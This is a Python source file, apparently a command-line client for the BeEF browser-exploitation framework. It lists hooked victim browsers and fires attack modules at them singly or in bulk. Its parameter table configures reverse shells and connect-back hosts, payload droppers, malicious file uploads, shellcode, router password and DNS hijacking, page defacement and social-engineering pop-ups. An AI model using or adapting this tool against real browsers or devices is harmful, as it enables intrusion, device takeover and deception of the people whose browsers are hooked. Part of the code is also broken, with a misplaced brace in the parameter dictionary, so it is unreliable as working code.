import requests, time, json, os, sys
from tabulate import tabulate
from datetime import datetime
from configparser import RawConfigParser
import Report_Gen.Report as rpt
from reportlab.lib.units import inch


class Beef_Project:

    def __init__(self, hostname, port, beef_hostname, beef_port, beef_username, beef_password):
        self._beef_username = beef_username
        self._beef_password = beef_password
        self._beef_hostname = beef_hostname
        self._beef_port = beef_port
        self.apikey = self._get_token()
        self._hook_browser_api = f'http://{hostname}:{port}/api/hooks?token={self.apikey}'
        self._hook_browser_details_api = f'http://{hostname}:{port}/api/hooks/session?token={self.apikey}'
        self._command_modules_api = f'http://{hostname}:{port}/api/modules?token={self.apikey}'
        self._command_module_info = f'http://{hostname}:{port}/api/modules/module_id?token={self.apikey}'
        self._launch_command = f'http://{hostname}:{port}/api/modules/session_id/module_id?token={self.apikey}'
        self._get_info_command_module_api = f'http://{hostname}:{port}/api/modules/session_id/module_id/cmd_id?token={self.apikey}'
        self._get_logs_api = f'http://{hostname}:{port}/api/logs?token={self.apikey}'
        self._get_browser_logs_api = f'http://{hostname}:{port}/api/logs/session_id?token={self.apikey}'
        self._get_method_modules = ['1', '2', '5', '6', '7', '9', '12', '13', '14', '27', '28', '29', '30', '31', '32',
                                    '33', '34', '36', '37', '38',
                                    '40', '43', '45', '46', '48', '50', '51', '53', '55', '58', '61', '62', '64', '65',
                                    '66', '67', '68', '69', '70',
                                    '71', '73', '75', '76', '78', '79', '81', '83', '85', '88', '93', '103', '105',
                                    '108', '116', '192', '193', '194', '196', '197', '198', '200', '201', '202', '203',
                                    '204', '208', '209', '210', '211', '213', '214', '216', '218', '220',
                                    '225', '229', '239', '240', '241', '242', '250', '256', '259', '260']
      
    def _get_token(self):
        resp = requests.post(url=f'http://{self._beef_hostname}:{self._beef_port}/api/admin/login',
                             data=json.dumps({"username": self._beef_username, "password": self._beef_password}),
                             headers={'Content-Type': 'application/json'})
        if resp.status_code == 200: return resp.json()['token']
        else:
            print(f'[-] Unable to Generate API Key, Error Code : {resp.status_code}')
            sys.exit(0)

    def read_config(self, section, property):
        config = RawConfigParser()
        config.read(os.getcwd().replace('\\', '/')+'/Edit_Modules.txt')
        return config.get(section, property)

    def get_post_dict(self):
        return {'3': {'servicename':{'servicename': self.read_config('3', 'service_name'), 'key': self.read_config('3', 'key'), 'value': self.read_config('3', 'value'), 'action': self.read_config('3', 'action')}, '4': {'title': self.read_config('4', 'title'), 'message': self.read_config('4', 'message'), 'buttonName': self.read_config('4', 'button_name')},
                           '8': {'file_name': self.read_config('8', 'file_name')}, '10': {'directory': self.read_config('10', 'directory')}, '11': {'title': self.read_config('11', 'title'), 'question': self.read_config('11', 'question'),'ans_yes': self.read_config('11', 'ans_yes'), 'ans_no': self.read_config('11', 'ans_no'), 'text': self.read_config('11', 'text')},
                           '15': {'hook_url': 'http://' + self.read_config('15', 'apache_server_ip') + ':' + self.read_config('15', 'apache_server_port') + '/hook.js'}, '16': {'file_upload_dst': self.read_config('16', 'server_path'), 'file_upload_src': self.read_config('16', 'device_file_path')}, '17': {'server': self.read_config('17', 'server_ip'), 'port': self.read_config('17', 'server_port'), 'commands': self.read_config('17', 'command')},
                           '19': {'payload_name': self.read_config('19', 'payload_name'), 'data': self.read_config('19', 'payload_information')}, '20': {'rhost': self.read_config('20', 'host_address'), 'rport': self.read_config('20', 'host_port'),'channel': self.read_config('20', 'channel'), 'nick': self.read_config('20', 'username'), 'message': self.read_config('20', 'message')}, '21': {'ip': self.read_config('21', 'target_ip'), 'port': self.read_config('21', 'target_port'), 'msg': self.read_config('21', 'custom_message')}, '22': {'ip': self.read_config('22', 'target_ip'), 'port': self.read_config('22', 'target_port'), 'command_timeout': self.read_config('22', 'command_timeout'), 'cmd': self.read_config('22', 'command'), 'result_size': self.read_config('22', 'result_size')},
                           '23': {'payload_name': self.read_config('23', 'payload_name'), 'zone': self.read_config('23', 'zone'), 'data': self.read_config('23', 'data')}, '24': {'ip': self.read_config('24', 'target_ip'), 'port': self.read_config('24', 'target_port'), 'recname': self.read_config('24', 'receiver_name'), 'recfax': self.read_config('24', 'receiver_fax_number'), 'Subject': self.read_config('24', 'subject'), 'msg': self.read_config('24', 'message')}, '25': {'rhost': self.read_config('25', 'target_ip'), 'rport': self.read_config('25', 'target_port'), 'timeout': self.read_config('25', 'timeout'), 'commands': self.read_config('25', 'commands')}, '26': {'rhost': self.read_config('26', 'target_ip'), 'rport': self.read_config('26', 'target_port'), 'timeout': self.read_config('26', 'timeout'), 'commands': self.read_config('26', 'commands')}, '35': {'urls': self.read_config('35', 'url')}, '39': {'deface_title': self.read_config('39', 'deface_title'), 'deface_favicon': self.read_config('39', 'deface_icon_path'), 'deface_content': self.read_config('39', 'deface_content')},
                           '41': {'url': self.read_config('41', 'url')}, '42': {'text': self.read_config('42', 'alert_dialog')}, '44': {'question': self.read_config('44', 'question')}, '47': {'url': self.read_config('47', 'url')}, '49': {'iframe_title': self.read_config('49', 'iframe_title'), 'iframe_favicon': self.read_config('49', 'iframe_icon_path'), 'iframe_src': self.read_config('49', 'iframe_source'), 'iframe_timeout': self.read_config('49', 'iframe_timeout')}, '52': {'fake_url': self.read_config('52', 'fake_url'), 'real_url': self.read_config('52', 'real_url'), 'domselectah': self.read_config('52', 'dom_selector')}, '54': {'deface_selector': self.read_config('54', 'deface_selector'), 'deface_content': self.read_config('54', 'deface_content')}, '56': {'tel_number': self.read_config('56', 'tel_number')}, '57': {'youtube_id': self.read_config('57', 'youtube_id'), 'jquery_selector': self.read_config('57', 'jquery_selector')}, '59': {'login_url': self.read_config('59', 'login_url')},
                           '60': {'redirect_url': self.read_config('60', 'redirect_url')}, '72': {'cId': self.read_config('72', 'command_id')}, '74': {'sound_file_uri': self.read_config('74', 'sound_url_file')}, '77':{'social_engineering_title': self.read_config('77', 'title'), 'social_engineering_text': self.read_config('77', 'text'), 'no_of_pictures': self.read_config('77', 'no_of_pictures'), 'interval': self.read_config('77', 'time_frame')}, '80': {'domain': self.read_config('80', 'domain'), 'data': self.read_config('80', 'send_data')}, '82': {'domain': self.read_config('82', 'domain'), 'data': self.read_config('82', 'send_data')}, '90': {'rhost': self.read_config('90', 'remote_host'), 'rport': self.read_config('90', 'remote_port'), 'timeout': self.read_config('90', 'timeout'), 'cmd': self.read_config('90', 'command')}, '91': {'rhost': self.read_config('91', 'remote_host'), 'rport': self.read_config('91', 'remote_port'), 'timeout': self.read_config('91', 'timeout'), 'cmd': self.read_config('91', 'command')}, '97': {'rhost': self.read_config('97', 'remote_host'), 'rport': self.read_config('97', 'remote_port'), 'timeout': self.read_config('97', 'timeout'), 'cmd': self.read_config('97', 'command')},
                           '92': {'rhost': self.read_config('92', 'remote_host'), 'rport': self.read_config('92', 'remote_port'), 'lhost': self.read_config('92', 'local_host'), 'lport': self.read_config('92', 'local_port')}, '109': {'rhost': self.read_config('109', 'remote_host'), 'rport': self.read_config('109', 'remote_port'), 'lhost': self.read_config('109', 'local_host'), 'lport': self.read_config('109', 'local_port')}, '115': {'rhost': self.read_config('115', 'remote_host'), 'rport': self.read_config('115', 'remote_port'), 'lhost': self.read_config('115', 'local_host'), 'lport': self.read_config('115', 'local_port')}, '130': {'rhost': self.read_config('130', 'remote_host'), 'rport': self.read_config('130', 'remote_port'), 'lhost': self.read_config('130', 'local_host'), 'lport': self.read_config('130', 'local_port')}, '133': {'rhost': self.read_config('133', 'remote_host'), 'rport': self.read_config('133', 'remote_port'), 'lhost': self.read_config('133', 'local_host'), 'lport': self.read_config('133', 'local_port')}, '94': {'vtiger_url': self.read_config('94', 'target_webserver'), 'vtiger_filepath': self.read_config('94', 'target_directory'), 'mal_filename': self.read_config('94', 'malicious_filename'), 'mal_ext': self.read_config('94', 'malicious_file_extension'), 'vtiger_php': self.read_config('94', 'inject_php'), 'upload_timeout': self.read_config('94', 'upload_timeout')},
                           '95': {'base': self.read_config('95', 'opencart_path'), 'password': self.read_config('95', 'password')}, '96': {'base': self.read_config('96', 'zenos_webroot'), 'username': self.read_config('96', 'username'), 'password': self.read_config('96', 'password'), 'user_level': self.read_config('96', 'user_level')}, '98': {'protocol': self.read_config('98', 'protocol'), 'host': self.read_config('98', 'hostname'), 'port': self.read_config('98', 'port'), 'usertype': self.read_config('98', 'usertype'), 'customerid': self.read_config('98', 'customer_id'), 'username': self.read_config('98', 'username'), 'password': self.read_config('98', 'password')}, '99': {'base': self.read_config('99', 'switch_web_root'), 'oldpassword': self.read_config('99', 'old_password'), 'newpassword': self.read_config('99', 'new_password')}, '100': {'rhost': self.read_config('100', 'remote_host'), 'rport': self.read_config('100', 'remote_port'), 'lhost': self.read_config('100', 'local_host'), 'lport': self.read_config('100', 'local_port'), 'user': self.read_config('100', 'username'), 'pass': self.read_config('100', 'password')}, '101': {'conn': self.read_config('101', 'payload'), 'cbhost': self.read_config('101', 'connect_back_to_host'), 'cbport': self.read_config('101', 'connect_back_to_port'), 'applet_id': self.read_config('101', 'applet_id'), 'applet_name': self.read_config('101', 'applet_name')},
                           '102': {'dropper_url': self.read_config('102', 'dropper_url'), 'applet_name': self.read_config('102', 'applet_name'), 'ie_only': self.read_config('102', 'ie_only')}, '106': {'cmd': self.read_config('106', 'command')}, '107': {'app_path': self.read_config('107', 'application_path')}, '110': {'uri': self.read_config('110', 'target_url')}, '111': {'uri': self.read_config('111', 'target_url')}, '112': {'uri': self.read_config('112', 'target_url')}}, '113': {'uri': self.read_config('113', 'target_url')}, '114': {'url': self.read_config('114', 'url')}, '117': {'method': self.read_config('117', 'http_method'), 'rproto': self.read_config('117', 'target_protocol'), 'rhost': self.read_config('117', 'target_hostname'), 'rport': self.read_config('117', 'target_port'), 'lhost': self.read_config('117', 'localhost'), 'lport': self.read_config('117', 'localport'), 'wait': self.read_config('117', 'wait_time_between_requests')}, '119': {'base': self.read_config('119', 'boast_machine_url'), 'username': self.read_config('119', 'username'), 'password': self.read_config('119', 'password'), 'email': self.read_config('119', 'email')}, '120': {'rproto': self.read_config('120', 'target_protocol'), 'rhost': self.read_config('120', 'target_hostname'), 'rport': self.read_config('120', 'target_port'), 'base_dir': self.read_config('120', 'base_directory'), 'payload': self.read_config('120', 'payload'), 'lhost': self.read_config('120', 'localhost'), 'lport': self.read_config('120', 'localport'), 'wait': self.read_config('120', 'wait_time_between_requests')},
                           '121': {'form_controller': self.read_config('121', 'form_controller_url'), 'jar_file': self.read_config('121', 'malicious_jar_file_url')}, '122':{'rhost': self.read_config('122', 'remote_host'), 'rport': self.read_config('122', 'remote_port'), 'rproto': self.read_config('122', 'target_protocol'), 'payload': self.read_config('122', 'payload'), 'lhost': self.read_config('122', 'localhost'), 'lport': self.read_config('122', 'localport')}, '123':{'Target': self.read_config('123', 'target_url'), 'method': self.read_config('123', 'http_method'), 'Bash_Command': self.read_config('123', 'bash_command')}, '124':{'base': self.read_config('124', 'axous_url'), 'username': self.read_config('124', 'username'), 'password': self.read_config('124', 'password'), 'email': self.read_config('124', 'email')}, '125': {'fileToRetrieve': self.read_config('125', 'retrieve_file'), 'os_combobox': self.read_config('125', 'cf_server_os'), 'cf_version': self.read_config('125', 'cf_version')}, '126': {'restHost': self.read_config('126', 'host_name'), 'warName': self.read_config('126', 'filename'), 'warBase': self.read_config('126', 'base64_of_exploit')}, '127': {'rhost': self.read_config('127', 'target_host'), 'service_port': self.read_config('127', 'service_port'), 'rport': self.read_config('127', 'beef_bind_port'), 'jmpesp': self.read_config('127', 'jmp_esp')}, '128': {'rhost': self.read_config('128', 'target_host'), 'service_port': self.read_config('128', 'target_port'), 'rport': self.read_config('128', 'beef_bind_port'), 'path': self.read_config('128', 'path'), 'delay': self.read_config('128', 'delay'), 'beef_host': self.read_config('128', 'beef_host'), 'beef_port': self.read_config('128', 'beef_port'), 'beef_junk_port': self.read_config('128', 'beef_junk_port'), 'beef_junk_socket': self.read_config('128', 'beef_junk_socket')},
                           '129': {'rhost': self.read_config('129', 'host_name'), 'rport': self.read_config('129', 'beef_bind_port'), 'path': self.read_config('129', 'path'), 'cmd': self.read_config('129', 'command'), 'shellcode': self.read_config('129', 'shell_code')}, '131': {'user': self.read_config('131', 'username'), 'pass': self.read_config('131', 'password'), 'email': self.read_config('131', 'email'), 'domail': self.read_config('131', 'domail'), 'url': self.read_config('131', 'website_url'), 'fname': self.read_config('131', 'first_name'), 'lname': self.read_config('131', 'last_name')}, '132': {'base': self.read_config('132', 'router_web_root'), 'cmd': self.read_config('132', 'command')}, '151': {'base': self.read_config('151', 'router_web_root'), 'cmd': self.read_config('151', 'command')}, '153': {'base': self.read_config('153', 'router_web_root'), 'cmd': self.read_config('153', 'command')}, '134': {'rhost': self.read_config('134', 'target_hostname'), 'rport': self.read_config('134', 'target_port'), 'lhost': self.read_config('134', 'msf_listener_host'), 'lport': self.read_config('134', 'msf_listener_port'), 'injectedCommand': self.read_config('134', 'command'), 'jspName': self.read_config('134', 'malicious_jsp_name'), 'payload': self.read_config('134', 'payload')}, '135': {'base': self.read_config('135', 'target_web_root_url'), 'password': self.read_config('135', 'desired_password')}, '136': {'base': self.read_config('136', 'target_web_root_url'), 'password': self.read_config('136', 'desired_password')}, '141': {'base': self.read_config('141', 'target_web_root_url'), 'password': self.read_config('141', 'desired_password')}, '152': {'base': self.read_config('152', 'target_web_root_url'), 'password': self.read_config('152', 'desired_password')}, '156': {'base': self.read_config('156', 'target_web_root_url'), 'password': self.read_config('156', 'desired_password')}, '160': {'base': self.read_config('160', 'target_web_root_url'), 'password': self.read_config('160', 'desired_password')}, '165': {'base': self.read_config('165', 'target_web_root_url'), 'password': self.read_config('165', 'desired_password')},
                           '137': {'base': self.read_config('137', 'router_web_root_url'), 'user': self.read_config('137', 'desired_username'), 'pass': self.read_config('137', 'desired_password')}, '138': {'rhost': self.read_config('138', 'remote_host'), 'rport': self.read_config('138', 'remote_port'), 'timeout': self.read_config('138', 'timeout'), 'cmd': self.read_config('138', 'command')}, '170': {'rhost': self.read_config('170', 'remote_host'), 'rport': self.read_config('170', 'remote_port'), 'timeout': self.read_config('170', 'timeout'), 'cmd': self.read_config('170', 'command')}, '140': {'host': self.read_config('140', 'router_web_root_url'), 'password': self.read_config('140', 'desired_password'), 'port': self.read_config('140', 'desired_web_ui_port'), 'telnet': self.read_config('140', 'desired_telnet_port')}, '142': {'rhost': self.read_config('142', 'remote_hostname'), 'dns1': self.read_config('142', 'primary_DNS_server'), 'dns2': self.read_config('142', 'secondary_DNS_server')}, '150': {'rhost': self.read_config('150', 'remote_hostname'), 'dns1': self.read_config('150', 'primary_DNS_server'), 'dns2': self.read_config('150', 'secondary_DNS_server')}, '157': {'rhost': self.read_config('157', 'remote_hostname'), 'dns1': self.read_config('157', 'primary_DNS_server'), 'dns2': self.read_config('157', 'secondary_DNS_server')}, '159': {'rhost': self.read_config('159', 'remote_hostname'), 'dns1': self.read_config('159', 'primary_DNS_server'), 'dns2': self.read_config('159', 'secondary_DNS_server')}, '164': {'rhost': self.read_config('164', 'remote_hostname'), 'dns1': self.read_config('164', 'primary_DNS_server'), 'dns2': self.read_config('164', 'secondary_DNS_server')}, '166': {'rhost': self.read_config('166', 'remote_hostname'), 'dns1': self.read_config('166', 'primary_DNS_server'), 'dns2': self.read_config('166', 'secondary_DNS_server')}, '143': {'rhost': self.read_config('143', 'remote_hostname'), 'password': self.read_config('143', 'desired_password')}, '147': {'rhost': self.read_config('147', 'remote_hostname'), 'password': self.read_config('147', 'desired_password')},
                           '144': {'base': self.read_config('144', 'router_web_root'), 'port': self.read_config('144', 'desired_port'), 'password': self.read_config('144', 'desired_password')}, '154': {'base': self.read_config('154', 'router_web_root'), 'port': self.read_config('154', 'desired_port'), 'password': self.read_config('154', 'desired_password')}, '155': {'base': self.read_config('155', 'router_web_root'), 'port': self.read_config('155', 'desired_web_ui_port'), 'password': self.read_config('155', 'desired_password')}, '158': {'base': self.read_config('158', 'router_web_root'), 'port': self.read_config('158', 'desired_web_ui_port'), 'password': self.read_config('158', 'desired_password')}, '169': {'base': self.read_config('169', 'router_web_root'), 'port': self.read_config('169', 'desired_port'), 'password': self.read_config('169', 'desired_password')}, '145': {'base': self.read_config('145', 'router_web_root'), 'user': self.read_config('145', 'desired_username'), 'password': self.read_config('145', 'desired_password'), 'port': self.read_config('145', 'desired_web_ui_port')}, '146': {'base': self.read_config('146', 'router_web_root'), 'exec_command': self.read_config('146', 'command')}, '148': {'base': self.read_config('148', 'router_web_root'), 'username': self.read_config('148', 'desired_username'), 'password': self.read_config('148', 'desired_password')}, '149': {'target_ip': self.read_config('149', 'target_host')}, '161': {'rhost': self.read_config('161', 'target_hostname')}, '162': {'rhost': self.read_config('162', 'remote_hostname'), 'dns1': self.read_config('162', 'primary_DNS_server')}, '163': {'rhost': self.read_config('163', 'remote_hostname'), 'ssid': self.read_config('163', 'ssid')}, '167': {'host': self.read_config('167', 'router_web_root'), 'cmd': self.read_config('167', 'command')}, '168': {'base': self.read_config('168', 'router_web_root'), 'payload': self.read_config('168', 'payload')}, '171': {'domain': self.read_config('171', 'beef_server_domain'), 'ps_url': self.read_config('171', 'powershell_HTA_handler')}, '172': {'targets': self.read_config('172', 'targetted_domains'), 'choosetmpl': self.read_config('172', 'choose_tmpl')},
                           '173': {'extension_name': self.read_config('173', 'extension_name'), 'xpi_name': self.read_config('173', 'xpi_name'), 'lport': self.read_config('173', 'listen_port')}, '174': {'url': self.read_config('174', 'url'), 'notification_text': self.read_config('174', 'notification_text')}, '190': {'url': self.read_config('190', 'url'), 'notification_text': self.read_config('190', 'notification_text')}, '175': {'xss_hook_url': self.read_config('175', 'xss_hook_url'), 'logout_gmail_interval': self.read_config('175', 'logout_gmail_interval'), 'wait_seconds_before_redirect': self.read_config('175', 'redirect_delay')}, '177': {'payload_handler': self.read_config('177', 'payload_handler')}, '178': {'url': self.read_config('178', 'redirect_url'), 'wait': self.read_config('178', 'wait')}, '180': {'clippydir': self.read_config('180', 'clippy_directory'), 'askusertext': self.read_config('180', 'ask_user_text'), 'exectueyes': self.read_config('180', 'exe_file_path'), 'respawntime': self.read_config('180', 'clippy_time_interval'), 'thankyoumessage': self.read_config('180', 'message')}, '181': {'notification_text': self.read_config('181', 'notification_text')}, '183': {'choice': self.read_config('183', 'choice'), 'backing': self.read_config('183', 'backing'), 'imgsauce': self.read_config('183', 'custom_logo_path')}, '184': {'url': self.read_config('184', 'plugin_url'), 'jquery_selector': self.read_config('184', 'jquery_selector')}, '185': {'image': self.read_config('185', 'image_path'), 'payload': self.read_config('185', 'payload'), 'payload_uri': self.read_config('185', 'payload_uri')}, '199': {'ipHost': self.read_config('199', 'hostname'), 'port': self.read_config('199', 'port')}, '206': {'key_paths': self.read_config('206', 'key_paths')}, '215': {'url': self.read_config('215', 'domain')}, '217': {'url': self.read_config('217', 'url'), 'theJS': self.read_config('217', 'javascript')}, '219': {'to': self.read_config('219', 'mobile_number'), 'message': self.read_config('219', 'message')},
                           '223': {'wordpress_url': self.read_config('223', 'wordpress_url')}, '224': {'hash': self.read_config('224', 'md5_hash')}, '226': {'iFrameSrc': self.read_config('226', 'iframe_source'), 'sendBackInterval': self.read_config('226', 'send_back_interval')}, '228': {'message': self.read_config('228', 'display_message'), 'timeout': self.read_config('228', 'timeout')}, '235': {'query': self.read_config('235', 'google_query')}, '236': {'cmd': self.read_config('236', 'javascript_code')}, '243': {'target': self.read_config('243', 'target'), 'domain': self.read_config('243', 'domain'), 'url_callback': self.read_config('243', 'callback_url')}, '244': {'dns_list': self.read_config('244', 'dns_list'), 'timeout': self.read_config('244', 'timeout')}, '252': {'tor_resource': self.read_config('252', 'tor_resource'), 'timeout': self.read_config('252', 'timeout')}, '258': {'ipHost': self.read_config('258', 'scan_ip_or_hostname'), 'ports': self.read_config('258', 'scan_ports'), 'closetimeout': self.read_config('258', 'closed_port_timeout'), 'delay': self.read_config('258', 'delay_between_requests'), 'debug': self.read_config('258', 'debug')}}

    def get_hooked_browsers(self, offline_mode=False, enable_print=True, report=False):
        sessions, initial_details = {}, {}
        resp = requests.get(url=self._hook_browser_api)
        if resp.status_code == 200:
            res = resp.json()
            online, offline = res['hooked-browsers']['online'], res['hooked-browsers']['offline']

            if offline_mode is False:
                if enable_print is True:
                    print(f'[*] Results are related to online mode : \n{"-"*50}')
                    total_list = []
                for k, v in online.items():
                    if enable_print is True: total_list.append([v['id'], v['name'], v['version'], v['os'], v['os_version'], v['platform'], v['ip'], v['domain'], v['port'], v['page_uri']])
                    sessions[v['ip']] = v['session']
                    if report is True:
                        initial_details.update({'ID': v['id'], 'Name': v['name'], 'Version': v['version'], 'OS': v['os'], 'OS Version': v['os_version'], 'PlatForm': v['platform'], 'IP': v['ip'], 'Domain': v['domain'], 'Port': v['port'], 'Page_URI': v['page_uri']})
                if enable_print is True: print(tabulate(total_list, headers=['ID','Name', 'Version', 'OS', 'OS Version', 'Platform', 'IPAddress', 'Domain', 'Port', 'Page URI'], tablefmt='orgtbl'))
                if report is False: return sessions
                elif report is True: return initial_details

            elif offline_mode is True:
                if enable_print is True:
                    print(f'[*] Results are related to offline mode : \n{"-"*50}')
                    total_list = []
                for k, v in offline.items():
                    if enable_print is True: total_list.append([v['id'], v['name'], v['version'], v['os'], v['os_version'], v['platform'], v['ip'], v['domain'], v['port'], v['page_uri']])
                    sessions[v['ip']] = v['session']
                    if report is True:
                        initial_details.update({'ID': v['id'], 'Name': v['name'], 'Version': v['version'], 'OS': v['os'], 'OS Version': v['os_version'], 'PlatForm': v['platform'], 'IP': v['ip'], 'Domain': v['domain'], 'Port': v['port'], 'Page_URI': v['page_uri']})
                if enable_print is True: print(tabulate(total_list, headers=['ID', 'Name', 'Version', 'OS', 'OS Version', 'Platform', 'IPAddress', 'Domain', 'Port', 'Page URI'], tablefmt='orgtbl'))
                if report is False: return sessions
                elif report is True: return initial_details
        else: print(f'[-] Unable to Connect, Error Code : {resp.status_code}')

    def get_hooked_browsers_details(self, sessions, report=False):
        for k, v in sessions.items():
            resp = requests.get(url=self._hook_browser_details_api.replace('session', v))
            if resp.status_code == 200:
                total_list = []
                for key, val in resp.json().items():
                    total_list.append([key, val])
                if report is False: print(tabulate(total_list, headers=['Browser/System Properties', 'Details'], tablefmt='orgtbl'))
                elif report is True: return total_list

    def get_logs(self):
        resp = requests.get(url=self._get_logs_api)
        if resp.status_code == 200:
            total_list, total_logs = [], 0
            for k, v in resp.json().items():
                if k == 'logs':
                    for d in v: total_list.append([d['id'], d['date'], d['type'], d['event']])
                elif k == 'logs_count': total_logs = v
            print(f'{"-"*70}\n\t[+] Total Logs Found : {total_logs}\n{"-"*70}')
            print(tabulate(total_list, headers=['ID', 'Date', 'Type', 'Event'], tablefmt='orgtbl'))
        else: print(f'[-] Unable to Find the browser logs, Error Code {resp.status_code}')

    def get_browser_logs(self, session_id):
        resp = requests.get(url=self._get_browser_logs_api.replace('session_id', session_id))
        if resp.status_code == 200:
            total_list, total_logs = [], 0
            for k, v in resp.json().items():
                if k == 'logs':
                    for d in v: total_list.append([d['id'], d['date'], d['type'], d['event']])
                elif k == 'logs_count': total_logs = v
            print(f'{"-"*70}\n\t[+] Total Logs Found : {total_logs}\n{"-"*70}')
            print(tabulate(total_list, headers=['ID', 'Date', 'Type', 'Event'], tablefmt='orgtbl'))
        else: print(f'[-] Unable to Find the browser logs, Error Code {resp.status_code}')

    def get_command_modules(self, enable_print=True):
        id_list = []
        resp = requests.get(url=self._command_modules_api)
        if resp.status_code == 200:
            if enable_print is True:
                print('[+] Available Command Modules for BEEF Framework........!')
                total_list = []
                for k, v in resp.json().items():
                    total_list.append([v['id'], v['class'], v['name'], v['category']])
                print(tabulate(total_list, headers=['Module ID', 'Module Class', 'Module Name', 'Module Category'], tablefmt='orgtbl'))
            elif enable_print is False:
                for k, v in resp.json().items(): id_list.append(v['id'])
                return id_list

    def specific_command_module_info(self, module_id, report=False):
        if isinstance(module_id, str):
            resp = requests.get(url=self._command_module_info.replace('module_id', module_id))
            if resp.status_code == 200:
                if report is False:
                    print(f"{'-'*70}\n")
                    for k, v in resp.json().items():
                        print(f'\t{k} : {v}\n')
                elif report is True:
                    res = resp.json()
                    info_dict = {'Module_Name': res.setdefault('name', 'No Info'), 'Module_Category': res.setdefault('category', 'No Info')}
                    return info_dict
        elif isinstance(module_id, list):
            print(f'{"-"*140}\n')
            for m in module_id:
                resp = requests.get(url=self._command_module_info.replace('module_id', str(m)))
                if resp.status_code == 200:
                    res = resp.json()
                    print(f'[+] Module Id : {m} Info: ')
                    print(f"\tModule Name : {res['name']}\n\tModule Description : {res['description']}\n\tModule Category : {res['category']}\n\tModule Options : ", end='')
                    if len(res['options']) != 0:
                        for d in res['options']: print(f"\n\t\tName : {d.setdefault('name', 'No Info')}, Value: {d.setdefault('value', 'No Info')}")
                    else: print('No Parameters')
                    print('-'*140)

    def launch_command(self, session_id, module_id, method, data=None, report=False):
        if method == 'post':
            resp = requests.post(url=self._launch_command.replace('session_id', session_id).replace('module_id', module_id), data=json.dumps(data), headers={'Content-Type':'application/json; charset=UTF-8'})
            if resp.status_code == 200:
                success, cmd = resp.json()['success'], resp.json()['command_id']
                if success == 'true':
                    if report is False: self.get_info_command_module(session_id=session_id, module_id=module_id, cmd_id=cmd, report=report)
                    elif report is True: return self.get_info_command_module(session_id=session_id, module_id=module_id, cmd_id=cmd, report=report)
                else: print('[-] Request Not Successful :(')
            else: print(f'[-] Unable to Connect, Response Code : {resp.status_code}')
        elif method == 'get':
            data = {'session':session_id, 'module_id':module_id}
            resp = requests.post(url=self._launch_command.replace('session_id', session_id).replace('module_id', module_id), data=json.dumps(data), headers={'Content-Type':'application/json; charset=UTF-8'})
            if resp.status_code == 200:
                success, cmd = resp.json()['success'], resp.json()['command_id']
                if success == 'true':
                    time.sleep(5)
                    if report is False: self.get_info_command_module(session_id=session_id, module_id=module_id, cmd_id=cmd, report=report)
                    elif report is True: return self.get_info_command_module(session_id=session_id, module_id=module_id, cmd_id=cmd, report=report)
                else: print('[-] Request Not Successful :(')
            else: print(f'[-] Unable to Connect, Response Code : {resp.status_code}')

    def get_info_command_module(self, session_id, module_id, cmd_id, report=False):
        count = 10
        while count <= 10:
            resp = requests.get(url=self._get_info_command_module_api.replace('session_id', session_id).replace('module_id', module_id).replace('cmd_id', cmd_id), headers={'Content-Type':'application/json; charset=UTF-8'})
            if resp.status_code == 200:
                total_list, total_dict = [], {}
                for k, v in resp.json().items():
                    date = datetime.strftime(datetime.strptime(str(datetime.fromtimestamp(float(v['date']))), '%Y-%m-%d %H:%M:%S'), '%d-%b-%Y %I:%M:%S %p')
                    total_list.append([date, json.loads(v['data'])['data']])
                total_dict[module_id] = total_list
                if report is False: print(f"{tabulate(total_list, headers=['Date', f'Result for Module Id : {module_id} | and Command Id : {cmd_id}'], tablefmt='orgtbl')}\n\n")
                elif report is True: return total_dict
                break
            count += 1
            time.sleep(10)
        if count == 11: print(f'Response Time out for Command Module Info: Module Id : {module_id} | Command Id : {cmd_id}')

    def report_module_info(self, module_no, sessions):
        print(f'\r[+] Module {module_no} is Running...............!', end='')
        if module_no in self._get_method_modules:
            res = self.launch_command(session_id=sessions, module_id=module_no, method='get', report=True)
            module_intro = self.specific_command_module_info(module_id=module_no, report=True)
            inner_list = [module_intro['Module_Name'], module_intro['Module_Category']]
            if len(res[module_no]) != 0: inner_list.extend(res[module_no])
            else: inner_list.extend(['No INfo', 'No Info'])
            return inner_list
        elif module_no in self.get_post_dict().keys():
            data = self.get_post_dict()[module_no]
            res = self.launch_command(session_id=sessions, module_id=module_no, method='post', data=data, report=True)
            module_intro = self.specific_command_module_info(module_id=module_no, report=True)
            inner_list = [module_intro['Module_Name'], module_intro['Module_Category']]
            if len(res[module_no]) != 0: inner_list.extend(res[module_no])
            else: inner_list.extend(['No INfo', 'No Info'])
            return inner_list

    def module_info(self, module_no, sessions, user_check=None):
        if module_no in self._get_method_modules:
            if user_check is not None: self.launch_command(session_id=sessions[user_check], module_id=module_no, method='get')
            else: self.launch_command(session_id=list(sessions.values())[0], module_id=module_no, method='get')
        elif module_no in self.get_post_dict().keys():
            data = self.get_post_dict()[module_no]
            if user_check is not None: self.launch_command(session_id=sessions[user_check], module_id=module_no, method='post', data=data)
            else: self.launch_command(session_id=list(sessions.values())[0], module_id=module_no, method='post', data=data)
        else: print(f'[-] Module {module_no} Not Implemented...!')

    @classmethod
    def intro(cls):
        print(f'\n{"#"*80}\n')
        print('\t _ _ _    _ _  _ _  _ _ _   _ _ _ __   __ _ _   _ _ _ _ ')
        print('\t| _ _  ) \\  \\ /  / | _ _  ) |  _ _ _| |  _ _ | | _ _ _|')
        print('\t| |__) )  \\  \\  /  | |_ ) ) | |_ _ _  | |_ _   | |_ __')
        print('\t|  _ _)    \\   /   | _ _ )  |  _ _ _| |  _ _ | |  _ __|')
        print('\t| |         | |    | | _) ) | |_ _ _  | | _ _  | |')
        print('\t|_|         |_|    | _ __ ) | _ _ __| | _ _ _| |_|')
        print('\n\t@Python Tool : Browser Exploitation Framework designed in python')
        print('\n\t@Author : Srinivas Kondapally')
        print('\n\t@Features : * Automated Command Modules Execution\n\t\t    * Report Generation\n\t\t    * Interaction to Online Hooked Browsers\n\t\t    * Fetching Browser Logs\n\t\t    * Provide Information about each and every command module')
        print(f'\n{"#"*80}\n')

    def user_choice(self):
        print(f'{"-"*50}')
        print('[1] Get Sessions List')
        print('[2] Get Online Hooked Browsers Information')
        print('[3] Get Offline Hooked Browsers Information')
        print('[4] Get Logs')
        print('[5] Get Browser Logs for specific Zombie')
        print('[6] Get Available Command Modules')
        print('[7] Information of Command Modules')
        print('[8] Specific Command Module Information')
        print('[9] Attack based on Command Module')
        print('[10] Attack All HTTP GET Methods at a Time')
        print('[11] Attack All HTTP POST Methods at a Time')
        print('[12] Generate BeEF Report')
        print('[13] Exit')
